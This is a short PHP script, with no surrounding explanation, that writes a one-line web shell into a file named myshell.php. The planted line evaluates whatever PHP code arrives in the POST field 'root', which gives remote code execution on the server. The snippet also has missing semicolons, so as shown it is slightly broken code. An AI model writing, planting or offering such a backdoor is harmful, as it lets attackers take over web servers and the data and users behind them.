<?php 
$shell = '<?php @eval($_POST["root"]); ?>' 
$handle = fopen('myshell.php','a');
fwrite($handle,$shell);
fclose($handle)


?>